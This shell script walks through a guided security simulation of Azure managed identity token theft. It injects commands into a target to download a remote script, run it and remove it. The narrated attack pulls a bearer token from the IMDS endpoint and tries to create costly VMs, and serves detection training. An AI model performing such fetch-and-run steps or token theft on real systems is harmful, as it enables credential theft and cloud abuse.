#!/usr/bin/sh

# Source the helper functions
. "$(dirname "$0")/../../scripts/tool.sh"

# Parse command line arguments
parse_args "$@"

print <<EOF
\033[1;37m# Educational Security Simulation - Azure Cloud Access Attack\033[0m

\033[1;33m⚠️  WARNING: This is a SIMULATION for demonstration purposes only! ⚠️\033[0m

${PURPLE}This demonstration simulates Azure managed identity token theft and resource \
abuse. The attack retrieves an OAuth2 bearer token from the Azure Instance Metadata \
Service (IMDS) and attempts to use that token to create expensive VMs across multiple \
Azure regions. This showcases how attackers pivot from workload compromise to Azure \
infrastructure abuse.\033[0m
EOF

step <<EOF
\033[1;35mTool Installation - Install Required Utilities\033[0m

${PURPLE}First, we need to ensure curl and jq are available on the target system. \
These tools are required to interact with the Azure IMDS endpoint and parse \
the JSON token response.\033[0m
EOF
wait_for_confirmation
inject "apt update && apt install -y curl jq"

step <<EOF
\033[1;35mDownload Azure Cloud Access Script\033[0m

${PURPLE}Download a script that will abuse an Azure managed identity token obtained \
from the Instance Metadata Service to attempt creating expensive VMs across multiple \
Azure regions. This demonstrates how attackers pivot from workload compromise to \
cloud resource abuse.\033[0m
EOF
wait_for_confirmation
# The GIT_SHA environment variable is set at container build time in app/Dockerfile
inject "curl -O https://raw.githubusercontent.com/DataDog/datadog-security-playground/${GIT_SHA}/assets/cloud-access-azure/cloud-access-azure.sh"

step <<EOF
\033[1;35mMake Azure Cloud Access Script Executable\033[0m

${PURPLE}Set execution permissions on the Azure cloud access script.\033[0m
EOF
wait_for_confirmation
inject "chmod +x cloud-access-azure.sh"

step <<EOF
\033[1;35mCloud Resource Abuse - Attempt Azure VM Creation\033[0m

${PURPLE}Now we execute the Azure cloud-access script which will automatically retrieve \
a managed identity bearer token from the Azure IMDS endpoint \
(http://169.254.169.254/metadata/identity/oauth2/token). \
The script will attempt (and fail) to create expensive VMs across multiple \
Azure regions, generating Azure Activity Log events that can be investigated.\033[0m

${PURPLE}For this scenario to generate cloud credential signals, the AKS node pool \
must have a managed identity assigned (configured automatically by the \
terraform/aks deployment).\033[0m
EOF
wait_for_confirmation
inject "./cloud-access-azure.sh"

step <<EOF
\033[1;35mCleanup - Remove Azure Cloud Access Artifacts\033[0m

${PURPLE}Remove the cloud access script to clean up after the demonstration.\033[0m
EOF
wait_for_confirmation
inject "rm -f cloud-access-azure.sh 2>/dev/null || true"

print <<EOF
${GREEN}Azure cloud access demonstration completed successfully! All artifacts have been cleaned up.\033[0m
EOF
